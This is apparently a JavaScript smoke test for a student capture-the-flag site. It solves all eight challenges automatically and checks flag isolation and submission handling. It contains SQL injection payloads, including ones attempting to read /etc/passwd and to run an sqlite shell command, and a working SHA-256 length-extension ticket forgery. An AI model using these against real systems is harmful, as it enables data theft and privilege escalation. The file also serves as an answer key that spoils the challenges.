import { fileURLToPath } from "node:url";
import { runInNewContext } from "node:vm";

const FINAL_FLAG_IDS = [
  "FLAG-01",
  "FLAG-02",
  "FLAG-03",
  "FLAG-04",
  "FLAG-05",
  "FLAG-06",
  "FLAG-07",
  "FLAG-08",
];

const FLAG_PATTERN = /KDUCTF\{[A-Za-z0-9_-]{32}\}/;
const FLAG_PATTERN_GLOBAL = /KDUCTF\{[A-Za-z0-9_-]{32}\}/g;
const SQLI_PAYLOAD = "' UNION SELECT id, flag, source FROM flags--";
const READFILE_PAYLOAD = "' UNION SELECT 1, readfile('/etc/passwd'), 'runtime'--";
const SQLITE_SHELL_PAYLOAD = "'; .shell echo runtime-challenge-smoke--";

const SHA256_K = new Uint32Array([
  0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,
  0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3, 0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,
  0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,
  0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,
  0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13, 0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,
  0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,
  0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,
  0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208, 0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2,
]);

function assert(condition, message) {
  if (!condition) {
    throw new Error(message);
  }
}

function randomStudentId(base) {
  return String(base + Math.floor(Math.random() * 79_999)).slice(0, 7);
}

function nextOption(argv, index, optionName) {
  const value = argv[index + 1];
  if (!value || value.startsWith("--")) {
    throw new Error(`${optionName} requires a value`);
  }
  return value;
}

export function parseArgs(argv) {
  const options = {
    baseUrl: "http://localhost",
    studentAId: null,
    studentAPassword: `ChallengeSmokeA-${Date.now()}-password`,
    studentBId: null,
    studentBPassword: `ChallengeSmokeB-${Date.now()}-password`,
    // Kept as accepted, unused compatibility options. This smoke no longer reads
    // runtime secrets or the database to discover participant flag values.
    composeFile: null,
    envFile: null,
    runtimeSecretsDir: null,
  };

  for (let index = 0; index < argv.length; index += 1) {
    const arg = argv[index];
    if (arg === "--") {
      continue;
    }
    if (arg === "--base-url") {
      options.baseUrl = nextOption(argv, index, "--base-url");
      index += 1;
      continue;
    }
    if (arg === "--student-a-id") {
      options.studentAId = nextOption(argv, index, "--student-a-id");
      index += 1;
      continue;
    }
    if (arg === "--student-a-password") {
      options.studentAPassword = nextOption(argv, index, "--student-a-password");
      index += 1;
      continue;
    }
    if (arg === "--student-b-id") {
      options.studentBId = nextOption(argv, index, "--student-b-id");
      index += 1;
      continue;
    }
    if (arg === "--student-b-password") {
      options.studentBPassword = nextOption(argv, index, "--student-b-password");
      index += 1;
      continue;
    }
    if (arg === "--compose-file") {
      options.composeFile = nextOption(argv, index, "--compose-file");
      index += 1;
      continue;
    }
    if (arg === "--env-file") {
      options.envFile = nextOption(argv, index, "--env-file");
      index += 1;
      continue;
    }
    if (arg === "--runtime-secrets-dir") {
      options.runtimeSecretsDir = nextOption(argv, index, "--runtime-secrets-dir");
      index += 1;
      continue;
    }
    throw new Error("unknown runtime challenge smoke option");
  }

  options.baseUrl = options.baseUrl.replace(/\/+$/, "");
  options.studentAId ??= randomStudentId(9_400_000);
  options.studentBId ??= randomStudentId(9_500_000);
  assert(/^\d{7}$/.test(options.studentAId), "student-a-id must be exactly 7 digits");
  assert(/^\d{7}$/.test(options.studentBId), "student-b-id must be exactly 7 digits");
  assert(options.studentAId !== options.studentBId, "student ids must be different");
  return options;
}

export function sqliSearchPath() {
  return `/community/board/search?q=${encodeURIComponent(SQLI_PAYLOAD)}`;
}

// Keep the old helper name as a source-compatible alias for callers outside the
// fixture test; its value now follows the current community-board route.
export const sqliSecretPostPath = sqliSearchPath;

export function readfileSearchPath() {
  return `/community/board/search?q=${encodeURIComponent(READFILE_PAYLOAD)}`;
}

export function sqliteShellSearchPath() {
  return `/community/board/search?q=${encodeURIComponent(SQLITE_SHELL_PAYLOAD)}`;
}

function hasFlagMaterial(value) {
  return /KDUCTF\{/.test(String(value));
}

export function extractFlag(body, context = "challenge response") {
  const matches = String(body).match(FLAG_PATTERN_GLOBAL) ?? [];
  assert(matches.length === 1, `${context} did not contain exactly one current flag`);
  assert(FLAG_PATTERN.test(matches[0]), `${context} contained an invalid flag shape`);
  return matches[0];
}

function assertNoFlagMaterial(body, context) {
  assert(!hasFlagMaterial(body), `${context} exposed flag material`);
}

function assertNoSensitiveResponseBody(body, context) {
  assertNoFlagMaterial(body, context);
  assert(!String(body).includes("ctf_session="), `${context} exposed session material`);
  assert(!String(body).includes("bonus_access="), `${context} exposed access token material`);
  assert(!String(body).includes("bonus_success="), `${context} exposed grant material`);
}

function assertNoStore(response, context) {
  assert(response.headers.get("cache-control")?.toLowerCase().includes("no-store"), `${context} was cacheable`);
}

function assertStatus(response, expected, context) {
  const expectedStatuses = Array.isArray(expected) ? expected : [expected];
  assert(expectedStatuses.includes(response.status), `${context} returned an unexpected status`);
}

function getSetCookies(headers) {
  if (typeof headers.getSetCookie === "function") {
    return headers.getSetCookie();
  }
  const value = headers.get("set-cookie");
  if (!value) {
    return [];
  }
  return value.split(/,(?=[A-Za-z_][A-Za-z0-9_-]*=)/);
}

function cookiePair(setCookie) {
  const pair = String(setCookie).split(";", 1)[0] ?? "";
  const separator = pair.indexOf("=");
  if (separator <= 0) {
    return null;
  }
  return { name: pair.slice(0, separator), value: pair.slice(separator + 1) };
}

export function mergeCookies(cookieHeader, headers) {
  const cookies = new Map();
  for (const part of String(cookieHeader ?? "").split(/;\s*/).filter(Boolean)) {
    const separator = part.indexOf("=");
    if (separator > 0) {
      cookies.set(part.slice(0, separator), part.slice(separator + 1));
    }
  }
  for (const setCookie of getSetCookies(headers)) {
    const pair = cookiePair(setCookie);
    if (pair) {
      cookies.set(pair.name, pair.value);
    }
  }
  return [...cookies.entries()].map(([name, value]) => `${name}=${value}`).join("; ");
}

export function getCookieValue(cookieHeader, name) {
  for (const part of String(cookieHeader ?? "").split(/;\s*/).filter(Boolean)) {
    const separator = part.indexOf("=");
    if (separator > 0 && part.slice(0, separator) === name) {
      return part.slice(separator + 1);
    }
  }
  return undefined;
}

export function setCookieValue(cookieHeader, name, value) {
  const cookies = new Map();
  for (const part of String(cookieHeader ?? "").split(/;\s*/).filter(Boolean)) {
    const separator = part.indexOf("=");
    if (separator > 0) {
      cookies.set(part.slice(0, separator), part.slice(separator + 1));
    }
  }
  cookies.set(name, value);
  return [...cookies.entries()].map(([key, currentValue]) => `${key}=${currentValue}`).join("; ");
}

async function request(options, path, init = {}) {
  const { json, cookie, ...fetchInit } = init;
  const headers = new Headers(fetchInit.headers ?? {});
  if (json !== undefined) {
    headers.set("content-type", "application/json");
  }
  if (cookie) {
    headers.set("cookie", cookie);
  }
  return fetch(`${options.baseUrl}${path}`, {
    ...fetchInit,
    signal: fetchInit.signal ?? AbortSignal.timeout(15_000),
    headers,
    redirect: fetchInit.redirect ?? "manual",
    body: json === undefined ? fetchInit.body : JSON.stringify(json),
  });
}

async function readText(response) {
  return response.text();
}

async function readJson(response, context) {
  const text = await readText(response);
  try {
    return JSON.parse(text);
  } catch {
    throw new Error(`${context} returned non-JSON data`);
  }
}

async function registerParticipant(options, studentId, password) {
  const response = await request(options, "/api/auth/register", {
    method: "POST",
    json: {
      studentId,
      password,
      consent: {
        consentVersion: "runtime-challenge-smoke",
        requiredLoggingAccepted: true,
        analyticsLoggingAccepted: false,
        cookieAccepted: true,
      },
    },
  });
  assertStatus(response, [200, 201], "participant registration");
  const setCookies = getSetCookies(response.headers);
  assert(setCookies.some((value) => /ctf_session=/i.test(value)), "registration did not set a session cookie");
  assert(setCookies.some((value) => /HttpOnly/i.test(value)), "session cookie was not HttpOnly");
  const body = await readText(response);
  assertNoSensitiveResponseBody(body, "registration response");
  const cookies = mergeCookies("", response.headers);
  assert(getCookieValue(cookies, "ctf_session"), "registration did not produce a usable session cookie");
  return cookies;
}

async function submitFlag(options, cookie, flagId, flag, expectedCorrect, context) {
  const response = await request(options, "/api/final-submit", {
    method: "POST",
    cookie,
    json: { flagsByFlagId: { [flagId]: flag } },
  });
  assertStatus(response, [200, 201], `${context} final submission`);
  assertNoStore(response, `${context} final submission`);
  const bodyText = await readText(response);
  assertNoSensitiveResponseBody(bodyText, `${context} final submission response`);
  let body;
  try {
    body = JSON.parse(bodyText);
  } catch {
    throw new Error(`${context} final submission returned non-JSON data`);
  }
  const result = body.resultsByFlagId?.[flagId];
  assert(result && typeof result.correct === "boolean", `${context} final submission omitted its result`);
  assert(result.correct === expectedCorrect, `${context} final submission had the wrong boolean result`);
}

async function challenge01(options, cookie) {
  const response = await request(options, "/campus/festival/", { cookie });
  assertStatus(response, 200, "challenge-01 page");
  assertNoStore(response, "challenge-01 page");
  const body = await readText(response);
  assert(body.includes("archive-note"), "challenge-01 omitted the archive note");
  assert(body.includes('id="draft-panel"'), "challenge-01 omitted the decoy panel");
  return extractFlag(body, "challenge-01 page");
}

async function challenge02(options, cookie) {
  const pageResponse = await request(options, "/system/status/", { cookie });
  assertStatus(pageResponse, 200, "challenge-02 page");
  assertNoStore(pageResponse, "challenge-02 page");
  const page = await readText(pageResponse);
  assert(page.includes("/system/status/assets/status.js"), "challenge-02 page lost its prefixed asset path");
  assertNoFlagMaterial(page, "challenge-02 page");

  const scriptResponse = await request(options, "/system/status/assets/status.js", { cookie });
  assertStatus(scriptResponse, 200, "challenge-02 status script");
  assertNoStore(scriptResponse, "challenge-02 status script");
  const script = await readText(scriptResponse);
  assert(script.includes("/system/status/api/status"), "challenge-02 script lost its prefixed API path");
  assert(!script.includes("api/debug"), "challenge-02 script exposed its debug path");
  assertNoFlagMaterial(script, "challenge-02 status script");

  const robotsResponse = await request(options, "/system/status/robots.txt", { cookie });
  assertStatus(robotsResponse, 200, "challenge-02 robots");
  assertNoStore(robotsResponse, "challenge-02 robots");
  const robots = await readText(robotsResponse);
  assert(robots.includes("Disallow: /system/status/api/debug"), "challenge-02 robots omitted the debug route");
  assertNoFlagMaterial(robots, "challenge-02 robots");

  const statusResponse = await request(options, "/system/status/api/status", { cookie });
  assertStatus(statusResponse, 200, "challenge-02 status API");
  assertNoStore(statusResponse, "challenge-02 status API");
  const statusBody = await readJson(statusResponse, "challenge-02 status API");
  assert(!hasFlagMaterial(JSON.stringify(statusBody)), "challenge-02 status API exposed a flag");
  assert(statusBody.status === "ok" && Array.isArray(statusBody.services), "challenge-02 status API shape changed");

  const debugResponse = await request(options, "/system/status/api/debug", { cookie });
  assertStatus(debugResponse, 200, "challenge-02 debug API");
  assertNoStore(debugResponse, "challenge-02 debug API");
  const debugBody = await readJson(debugResponse, "challenge-02 debug API");
  assert(debugBody.debug === true && debugBody.mode === "development", "challenge-02 debug marker changed");
  assert(typeof debugBody.flag === "string" && FLAG_PATTERN.test(debugBody.flag), "challenge-02 debug API omitted its flag");
  return debugBody.flag;
}

async function challenge03(options, cookie) {
  const pageResponse = await request(options, "/student/assignments/", { cookie });
  assertStatus(pageResponse, 200, "challenge-03 page");
  assertNoStore(pageResponse, "challenge-03 page");
  const page = await readText(pageResponse);
  assert(page.includes("/student/assignments/view?id=1"), "challenge-03 page omitted its detail link");
  assertNoFlagMaterial(page, "challenge-03 page");

  const hiddenResponse = await request(options, "/student/assignments/view?id=4", { cookie });
  assertStatus(hiddenResponse, 200, "challenge-03 hidden detail");
  assertNoStore(hiddenResponse, "challenge-03 hidden detail");
  const hidden = await readText(hiddenResponse);
  assert(hidden.includes("비공개 과제 검토"), "challenge-03 hidden detail row changed");
  const flag = extractFlag(hidden, "challenge-03 hidden detail");

  const invalidResponse = await request(options, "/student/assignments/view?id=%3Cscript%3E", { cookie });
  assertStatus(invalidResponse, 400, "challenge-03 invalid detail id");
  const invalid = await readText(invalidResponse);
  assertNoFlagMaterial(invalid, "challenge-03 invalid detail response");
  assert(!invalid.includes("<script>"), "challenge-03 invalid detail reflected executable markup");
  return flag;
}

export function runAdminBundle(script, isAdmin) {
  let storedValue = isAdmin ? "true" : null;
  let panelVisible = false;
  let textContent = "";
  const localStorage = {
    getItem(name) {
      return name === "isAdmin" ? storedValue : null;
    },
    setItem(name, value) {
      if (name === "isAdmin") {
        storedValue = String(value);
      }
    },
  };
  const panel = {
    removeAttribute(name) {
      if (name === "hidden") {
        panelVisible = true;
      }
    },
  };
  const box = {};
  Object.defineProperty(box, "textContent", {
    get() {
      return textContent;
    },
    set(value) {
      textContent = String(value);
    },
  });
  const document = {
    getElementById(name) {
      if (name === "admin-panel") return panel;
      if (name === "flag-box") return box;
      return null;
    },
  };
  runInNewContext(script, { localStorage, document }, { timeout: 1000 });
  return { panelVisible, textContent };
}

async function challenge04(options, cookie) {
  const pageResponse = await request(options, "/clubs/admin/", { cookie });
  assertStatus(pageResponse, 200, "challenge-04 page");
  assertNoStore(pageResponse, "challenge-04 page");
  const page = await readText(pageResponse);
  assert(page.includes("/clubs/admin/assets/app.js"), "challenge-04 page lost its prefixed asset path");
  assertNoFlagMaterial(page, "challenge-04 page");

  const scriptResponse = await request(options, "/clubs/admin/assets/app.js", { cookie });
  assertStatus(scriptResponse, 200, "challenge-04 admin script");
  assertNoStore(scriptResponse, "challenge-04 admin script");
  const script = await readText(scriptResponse);
  assert(script.includes('localStorage.getItem("isAdmin")'), "challenge-04 script lost its localStorage check");
  assert(script.includes("textContent"), "challenge-04 script lost its safe DOM assignment");
  const flag = extractFlag(script, "challenge-04 admin script");
  assert(!runAdminBundle(script, false).panelVisible, "challenge-04 panel was visible without admin storage");
  const enabled = runAdminBundle(script, true);
  assert(enabled.panelVisible && enabled.textContent === flag, "challenge-04 localStorage path did not reveal the current flag");
  return flag;
}

async function challenge05(options, cookie) {
  const pageResponse = await request(options, "/clubs/security/", { cookie });
  assertStatus(pageResponse, 200, "challenge-05 page");
  assertNoStore(pageResponse, "challenge-05 page");
  const page = await readText(pageResponse);
  assert(page.includes("/clubs/security/assets/main.js"), "challenge-05 page lost its prefixed asset path");
  assertNoFlagMaterial(page, "challenge-05 page");

  const scriptResponse = await request(options, "/clubs/security/assets/main.js", { cookie });
  assertStatus(scriptResponse, 200, "challenge-05 bundle");
  assertNoStore(scriptResponse, "challenge-05 bundle");
  const script = await readText(scriptResponse);
  assert(script.includes("BUILD NOTE(deploy)"), "challenge-05 bundle omitted its deployment note");
  assert(script.includes("/clubs/build-archive/assets/main.js.map"), "challenge-05 bundle lost its prefixed source-map link");
  return extractFlag(script, "challenge-05 bundle");
}

async function challenge06(options, cookie) {
  const pageResponse = await request(options, "/clubs/build-archive/", { cookie });
  assertStatus(pageResponse, 200, "challenge-06 page");
  assertNoStore(pageResponse, "challenge-06 page");
  const page = await readText(pageResponse);
  assert(page.includes("/clubs/build-archive/assets/main.js.map"), "challenge-06 page omitted its source-map link");
  assertNoFlagMaterial(page, "challenge-06 page");

  const mapResponse = await request(options, "/clubs/build-archive/assets/main.js.map", { cookie });
  assertStatus(mapResponse, 200, "challenge-06 source map");
  assertNoStore(mapResponse, "challenge-06 source map");
  const mapText = await readText(mapResponse);
  let sourceMap;
  try {
    sourceMap = JSON.parse(mapText);
  } catch {
    throw new Error("challenge-06 source map returned non-JSON data");
  }
  assert(sourceMap.version === 3 && sourceMap.file === "main.js", "challenge-06 source map shape changed");
  assert(Array.isArray(sourceMap.sourcesContent) && sourceMap.sourcesContent.length > 0, "challenge-06 source map omitted sourcesContent");
  assert(sourceMap.sourcesContent[0].includes("ARCHIVE_ENTRY"), "challenge-06 source map omitted its archive entry");
  return extractFlag(mapText, "challenge-06 source map");
}

async function challenge07(options, cookie) {
  const pageResponse = await request(options, "/community/board/", { cookie });
  assertStatus(pageResponse, 200, "challenge-07 page");
  assertNoStore(pageResponse, "challenge-07 page");
  const page = await readText(pageResponse);
  assert(page.includes("/community/board/search"), "challenge-07 page omitted its search route");
  assertNoFlagMaterial(page, "challenge-07 page");

  const normalResponse = await request(options, "/community/board/search?q=%EC%A4%91%EA%B0%84%EA%B3%A0%EC%82%AC", { cookie });
  assertStatus(normalResponse, 200, "challenge-07 normal search");
  assertNoStore(normalResponse, "challenge-07 normal search");
  const normal = await readText(normalResponse);
  assertNoFlagMaterial(normal, "challenge-07 normal search");

  const injectionResponse = await request(options, sqliSearchPath(), { cookie });
  assertStatus(injectionResponse, 200, "challenge-07 SQL injection search");
  assertNoStore(injectionResponse, "challenge-07 SQL injection search");
  const injection = await readText(injectionResponse);
  assert(injection.includes("runtime"), "challenge-07 SQL injection result omitted its seeded source");
  const flag = extractFlag(injection, "challenge-07 SQL injection search");

  const readfileResponse = await request(options, readfileSearchPath(), { cookie });
  assertStatus(readfileResponse, 400, "challenge-07 readfile escape");
  const readfile = await readText(readfileResponse);
  assertNoFlagMaterial(readfile, "challenge-07 readfile escape");
  assert(!readfile.includes("root:"), "challenge-07 readfile escape exposed a file");

  const shellResponse = await request(options, sqliteShellSearchPath(), { cookie });
  assertStatus(shellResponse, 400, "challenge-07 sqlite shell escape");
  const shell = await readText(shellResponse);
  assertNoFlagMaterial(shell, "challenge-07 sqlite shell escape");
  assert(!shell.includes("runtime-challenge-smoke"), "challenge-07 sqlite shell escape executed a command");
  return flag;
}

function rotr(value, amount) {
  return (value >>> amount) | (value << (32 - amount));
}

function compress(state, block) {
  const words = new Uint32Array(64);
  for (let index = 0; index < 16; index += 1) {
    words[index] = ((block[index * 4] << 24) | (block[index * 4 + 1] << 16) | (block[index * 4 + 2] << 8) | block[index * 4 + 3]) >>> 0;
  }
  for (let index = 16; index < 64; index += 1) {
    const s0 = rotr(words[index - 15], 7) ^ rotr(words[index - 15], 18) ^ (words[index - 15] >>> 3);
    const s1 = rotr(words[index - 2], 17) ^ rotr(words[index - 2], 19) ^ (words[index - 2] >>> 10);
    words[index] = (words[index - 16] + s0 + words[index - 7] + s1) >>> 0;
  }
  const working = Uint32Array.from(state);
  for (let index = 0; index < 64; index += 1) {
    const s1 = rotr(working[4], 6) ^ rotr(working[4], 11) ^ rotr(working[4], 25);
    const choose = (working[4] & working[5]) ^ (~working[4] & working[6]);
    const t1 = (working[7] + s1 + choose + SHA256_K[index] + words[index]) >>> 0;
    const s0 = rotr(working[0], 2) ^ rotr(working[0], 13) ^ rotr(working[0], 22);
    const majority = (working[0] & working[1]) ^ (working[0] & working[2]) ^ (working[1] & working[2]);
    const t2 = (s0 + majority) >>> 0;
    working[7] = working[6];
    working[6] = working[5];
    working[5] = working[4];
    working[4] = (working[3] + t1) >>> 0;
    working[3] = working[2];
    working[2] = working[1];
    working[1] = working[0];
    working[0] = (t1 + t2) >>> 0;
  }
  return working.map((value, index) => (value + state[index]) >>> 0);
}

export function sha256Padding(lengthBytes) {
  const lengthBits = lengthBytes * 8;
  let zeroBytes = 56 - ((lengthBytes + 1) % 64);
  if (zeroBytes < 0) {
    zeroBytes += 64;
  }
  const padding = Buffer.alloc(1 + zeroBytes + 8);
  padding[0] = 0x80;
  padding.writeUInt32BE(Math.floor(lengthBits / 2 ** 32), 1 + zeroBytes);
  padding.writeUInt32BE(lengthBits >>> 0, 5 + zeroBytes);
  return padding;
}

function sha256FromState(initialState, data) {
  assert(data.byteLength % 64 === 0, "length-extension data was not block aligned");
  let state = Uint32Array.from(initialState);
  for (let offset = 0; offset < data.byteLength; offset += 64) {
    state = compress(state, data.subarray(offset, offset + 64));
  }
  return Array.from(state).map((value) => value.toString(16).padStart(8, "0")).join("");
}

function digestToState(digest) {
  assert(/^[a-f0-9]{64}$/i.test(digest), "ticket digest had an invalid shape");
  return new Uint32Array(digest.match(/.{8}/g).map((chunk) => Number.parseInt(chunk, 16)));
}

export function forgeVaultTicket(ticketValue) {
  const separator = ticketValue.lastIndexOf(".");
  assert(separator > 0 && separator < ticketValue.length - 1, "guest ticket had an invalid shape");
  const payload = Buffer.from(ticketValue.slice(0, separator), "base64url");
  const originalDigest = ticketValue.slice(separator + 1);
  const keyLength = 32;
  const suffix = Buffer.from("&role=winner", "utf8");
  const glue = sha256Padding(keyLength + payload.byteLength);
  const forgedPayload = Buffer.concat([payload, glue, suffix]);
  const continuation = Buffer.concat([
    suffix,
    sha256Padding(keyLength + payload.byteLength + glue.byteLength + suffix.byteLength),
  ]);
  const forgedDigest = sha256FromState(digestToState(originalDigest), continuation);
  return `${forgedPayload.toString("base64url")}.${forgedDigest}`;
}

async function challenge08(options, cookie, otherCookie) {
  const vaultResponse = await request(options, "/bonus/vault/", { cookie });
  assertStatus(vaultResponse, 200, "challenge-08 vault page");
  assertNoStore(vaultResponse, "challenge-08 vault page");
  const vault = await readText(vaultResponse);
  assert(vault.includes('action="/bonus/vault/check"'), "challenge-08 form lost its prefixed check path");
  assertNoFlagMaterial(vault, "challenge-08 vault page");
  const ticketCookie = mergeCookies(cookie, vaultResponse.headers);
  const guestTicket = getCookieValue(ticketCookie, "vault_ticket");
  assert(guestTicket, "challenge-08 did not issue a guest ticket");

  const forgedTicket = forgeVaultTicket(guestTicket);
  const forgedCookie = setCookieValue(ticketCookie, "vault_ticket", forgedTicket);
  const foreignTicketCookie = setCookieValue(otherCookie, "vault_ticket", forgedTicket);
  const foreignCheckResponse = await request(options, "/bonus/vault/check", {
    method: "POST",
    cookie: foreignTicketCookie,
  });
  assertStatus(foreignCheckResponse, 403, "challenge-08 cross-session ticket");
  assertNoFlagMaterial(await readText(foreignCheckResponse), "challenge-08 cross-session ticket");

  const checkResponse = await request(options, "/bonus/vault/check", {
    method: "POST",
    cookie: forgedCookie,
  });
  assertStatus(checkResponse, 303, "challenge-08 winner check");
  const location = checkResponse.headers.get("location");
  assert(location, "challenge-08 winner check omitted its redirect");
  const redirect = new URL(location, options.baseUrl);
  assert(redirect.pathname === "/bonus/vault/prize" && !redirect.search && !redirect.hash, "challenge-08 grant used a query token");
  const setCookies = getSetCookies(checkResponse.headers);
  assert(setCookies.length >= 2, "challenge-08 winner check omitted its grant cookies");
  assert(setCookies.every((value) => /Path=\/bonus\/vault\/prize/i.test(value)), "challenge-08 grant cookie path escaped its prefix");
  assert(setCookies.every((value) => /HttpOnly/i.test(value) && /Secure/i.test(value) && /SameSite=Strict/i.test(value)), "challenge-08 grant cookies lost security attributes");
  const grantCookie = mergeCookies(forgedCookie, checkResponse.headers);
  assert(getCookieValue(grantCookie, "bonus_access"), "challenge-08 omitted bonus_access");
  assert(getCookieValue(grantCookie, "bonus_success"), "challenge-08 omitted bonus_success");

  const wrongGrantCookie = setCookieValue(grantCookie, "bonus_success", "wrong-grant-cookie");
  const wrongPrizeResponse = await request(options, "/bonus/vault/prize", { cookie: wrongGrantCookie });
  assertStatus(wrongPrizeResponse, 403, "challenge-08 mismatched grant");
  const wrongPrize = await readText(wrongPrizeResponse);
  assertNoFlagMaterial(wrongPrize, "challenge-08 mismatched grant");

  const foreignGrantCookie = setCookieValue(
    grantCookie,
    "ctf_session",
    getCookieValue(otherCookie, "ctf_session"),
  );
  const foreignPrizeResponse = await request(options, "/bonus/vault/prize", { cookie: foreignGrantCookie });
  assertStatus(foreignPrizeResponse, 403, "challenge-08 cross-session grant");
  assertNoFlagMaterial(await readText(foreignPrizeResponse), "challenge-08 cross-session grant");

  const prizeResponse = await request(options, "/bonus/vault/prize", { cookie: grantCookie });
  assertStatus(prizeResponse, 200, "challenge-08 prize");
  assertNoStore(prizeResponse, "challenge-08 prize");
  const prize = await readText(prizeResponse);
  const flag = extractFlag(prize, "challenge-08 prize");

  const replayResponse = await request(options, "/bonus/vault/prize", { cookie: grantCookie });
  assertStatus(replayResponse, 403, "challenge-08 replayed grant");
  const replay = await readText(replayResponse);
  assertNoFlagMaterial(replay, "challenge-08 replayed grant");
  return flag;
}

async function collectUserFlags(options, user, otherUser) {
  const flags = {};
  flags["FLAG-01"] = await challenge01(options, user.cookie);
  flags["FLAG-02"] = await challenge02(options, user.cookie);
  flags["FLAG-03"] = await challenge03(options, user.cookie);
  flags["FLAG-04"] = await challenge04(options, user.cookie);
  flags["FLAG-05"] = await challenge05(options, user.cookie);
  flags["FLAG-06"] = await challenge06(options, user.cookie);
  flags["FLAG-07"] = await challenge07(options, user.cookie);
  flags["FLAG-08"] = await challenge08(options, user.cookie, otherUser.cookie);
  return flags;
}

async function verifySubmissions(options, userA, userB) {
  for (const flagId of FINAL_FLAG_IDS) {
    await submitFlag(options, userA.cookie, flagId, userA.flags[flagId], true, `${flagId} participant A`);
    await submitFlag(options, userB.cookie, flagId, userA.flags[flagId], false, `${flagId} foreign value`);
    await submitFlag(options, userB.cookie, flagId, userB.flags[flagId], true, `${flagId} participant B`);
  }
}

async function verifyClearFlow(options, user) {
  const response = await request(options, "/api/final-submit", {
    method: "POST",
    cookie: user.cookie,
    json: { flagsByFlagId: user.flags },
  });
  assertStatus(response, [200, 201], "complete final submission");
  assertNoStore(response, "complete final submission");
  const bodyText = await readText(response);
  assertNoSensitiveResponseBody(bodyText, "complete final submission response");
  const body = JSON.parse(bodyText);
  assert(body.cleared === true && body.correctCount === 8, "complete final submission did not clear");
  assert(body.clearRedirectTo === "/clear", "complete final submission omitted the clear redirect");

  const clearSetCookie = getSetCookies(response.headers).find((value) => /^ctf_clear_once=/i.test(value));
  assert(clearSetCookie, "complete final submission omitted ctf_clear_once");
  assert(/HttpOnly/i.test(clearSetCookie), "ctf_clear_once was not HttpOnly");
  assert(/Secure/i.test(clearSetCookie), "ctf_clear_once was not Secure");
  assert(/SameSite=Strict/i.test(clearSetCookie), "ctf_clear_once was not SameSite=Strict");
  assert(/Path=\/clear/i.test(clearSetCookie), "ctf_clear_once escaped the clear path");

  const clearCookie = mergeCookies(user.cookie, response.headers);
  const clearResponse = await request(options, "/clear", { cookie: clearCookie });
  assertStatus(clearResponse, 200, "one-time clear certificate");
  assertNoStore(clearResponse, "one-time clear certificate");
  const clearPage = await readText(clearResponse);
  assert(clearPage.includes(user.studentId), "clear certificate omitted the current participant student id");
  assertNoFlagMaterial(clearPage, "clear certificate");
  assert(!clearPage.includes("ctf_clear_once"), "clear certificate exposed clear token material");

  const replayResponse = await request(options, "/clear", { cookie: clearCookie });
  assertStatus(replayResponse, [302, 303, 307, 308], "replayed clear certificate");
  const replayLocation = replayResponse.headers.get("location");
  assert(replayLocation && new URL(replayLocation, options.baseUrl).pathname === "/submit", "clear replay did not return to submit");
}

async function verifyIsolation(userA, userB) {
  for (const flagId of FINAL_FLAG_IDS) {
    assert(typeof userA.flags[flagId] === "string" && FLAG_PATTERN.test(userA.flags[flagId]), `${flagId} participant A flag shape changed`);
    assert(typeof userB.flags[flagId] === "string" && FLAG_PATTERN.test(userB.flags[flagId]), `${flagId} participant B flag shape changed`);
    assert(userA.flags[flagId] !== userB.flags[flagId], `${flagId} was shared between participants`);
  }
}

async function main() {
  try {
    const options = parseArgs(process.argv.slice(2));
    const userA = { cookie: "", flags: null, studentId: options.studentAId };
    const userB = { cookie: "", flags: null, studentId: options.studentBId };

    userA.cookie = await registerParticipant(options, options.studentAId, options.studentAPassword);
    userB.cookie = await registerParticipant(options, options.studentBId, options.studentBPassword);
    console.log("[runtime-challenge-smoke] registered sessions: ok");

    userA.flags = await collectUserFlags(options, userA, userB);
    console.log("[runtime-challenge-smoke] participant A challenge paths: ok");
    userB.flags = await collectUserFlags(options, userB, userA);
    console.log("[runtime-challenge-smoke] participant B challenge paths: ok");

    await verifyIsolation(userA, userB);
    console.log("[runtime-challenge-smoke] flag isolation: ok");
    await verifySubmissions(options, userA, userB);
    console.log("[runtime-challenge-smoke] final-submit booleans: ok");
    await verifyClearFlow(options, userA);
    console.log("[runtime-challenge-smoke] one-time clear certificate: ok");
    console.log("[runtime-challenge-smoke] completed: true");
  } catch {
    // Do not print exception text: it may contain a URL, cookie, submitted flag,
    // or a token emitted by a dependency. The step statuses are intentionally
    // boolean-only for deployment logs.
    console.error("[runtime-challenge-smoke] completed: false");
    process.exitCode = 1;
  }
}

if (process.argv[1] && fileURLToPath(import.meta.url) === process.argv[1]) {
  void main();
}
